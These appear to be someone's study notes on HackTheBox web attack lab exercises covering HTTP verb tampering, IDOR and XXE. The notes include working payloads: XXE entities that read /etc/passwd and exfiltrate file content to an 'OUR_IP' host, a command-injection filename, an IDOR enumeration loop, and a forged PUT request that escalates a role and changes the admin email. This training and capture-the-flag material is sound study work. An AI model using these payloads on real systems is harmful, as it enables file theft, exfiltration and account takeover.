# Web Application Attacks  

>My [Burp Suite Certified Practitioner Study material](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/README.md) cover some of the same topics listed here, with more detail.  
>[HackTheBox Academy Web Attacks](https://academy.hackthebox.com/module/134/section/1158)  

## HTTP Verb Tampering

>HTTP has 9 different [verbs](https://academy.hackthebox.com/module/134/section/1159) that can be accepted as HTTP methods by web servers.  
>[HTTP Request Methods Mozilla Reference](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods)  

### HTTP Methods  
```
GET
HEAD
POST
PUT
DELETE
CONNECT
OPTIONS
PATCH
TRACE
```  

>[Bypassing Basic Authentication](https://academy.hackthebox.com/module/134/section/1175)  


  
| **Command**   | **Description**   |
| --------------|-------------------|
| `-X OPTIONS` | Set HTTP Method with Curl |

## IDOR

>[Insecure Direct Object References (IDOR)](https://academy.hackthebox.com/module/134/section/1179) vulnerabilities.

### Identify IDORS  

>[Identifying IDORs](https://academy.hackthebox.com/module/134/section/1180)  
>[BSCP IDOR Notes](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/README.md#access-control)  

- In `URL parameters & APIs`
- In `AJAX Calls`
- By `understanding reference hashing/encoding`
- By `comparing user roles`

| **Command**   | **Description**   |
| --------------|-------------------|
| `md5sum` | MD5 hash a string |
| `base64` | Base64 encode a string |

>IDOR Mass Enumeration bash script to create MD5 payloads.  

```bash
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```  


## XXE

| **Code**   | **Description**   |
| --------------|-------------------|
| `<!ENTITY xxe SYSTEM "http://localhost/email.dtd">` | Define External Entity to a URL |
| `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Define External Entity to a file path |
| `<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">` | Read PHP source code with base64 encode filter |
| `<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">` | Reading a file through a PHP error |
| `<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">` | Reading a file OOB exfiltration |

# Web Attack Exercises  

>Try to use what you learned in [Bypassing Basic Authentication](https://academy.hackthebox.com/module/134/section/1175) section to access the 'reset.php' page and delete all files. Once all files are deleted, you should get the flag.  

![web-attack-auth-bypass-header](/images/web-attack-auth-bypass-header.png)  

>To get the flag, try to bypass the command injection filter through HTTP Verb Tampering, while using the following filename: file; cp /flag.txt ./  

>Change the GET method to POST to [bypass security filters](https://academy.hackthebox.com/module/134/section/1178).  

![web-attack-Bypassing-Security-Filters](/images/web-attack-Bypassing-Security-Filters.png)  

>Repeat what you learned in [Mass IDOR Enumeration](https://academy.hackthebox.com/module/134/section/1186) section to get a list of documents of the first 20 user uid's in /documents.php, one of which should have a '.txt' file with the flag.  

![web-attack-IDOR-employee-uid](/images/web-attack-IDOR-employee-uid.png)  

>Intruder with grep for `txt` sniper attack on uid value `1..20`.

![web-attack-IDOR-intruder-flag](/images/web-attack-IDOR-intruder-flag.png)  

>[Bypassing Encoded References](https://academy.hackthebox.com/module/134/section/1187) Try to download the contracts of the first 20 employee, one of which should contain the flag, which you can read with 'cat'. You can either calculate the 'contract' parameter value, or calculate the '.pdf' file name directly.  

![web-attack-IDOR-Bypassing-Encoded-References](/images/web-attack-IDOR-Bypassing-Encoded-References.png)  

>URL Encode the characters of the payload for the intruder attack above.  

>[IDOR in Insecure APIs](https://academy.hackthebox.com/module/134/section/1201) Try to read the details of the user with 'uid=5'. What is their 'uuid' value?  

>Intercept `Update Profile` request in Burp.  

![web-attack-IDOR-apis](/images/web-attack-IDOR-apis.png)  

>[Chaining IDOR Vulnerabilities](https://academy.hackthebox.com/module/134/section/1200) - Change the admin's email to `flag@idor.htb`, and you should get the flag on the 'edit profile' page.

![web-attack-Chaining-IDOR-Vulnerabilities](/images/web-attack-Chaining-IDOR-Vulnerabilities.png)  

>Create new `PUT` request with the information from the GET request above, and replace JSON field value of email.  

```HTML
PUT /profile/api.php/profile/10 HTTP/1.1
Host: 94.237.56.76:38781
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-type: application/json
Content-Length: 179
Connection: close
Cookie: role=employee

{
 "uid":"10","uuid":"bfd92386a1b48076792e68b596846499","role":"staff_admin","full_name":"admin","email":"flag@idor.htb","about":"Never gonna give you up, Never gonna let you down"
}
```  

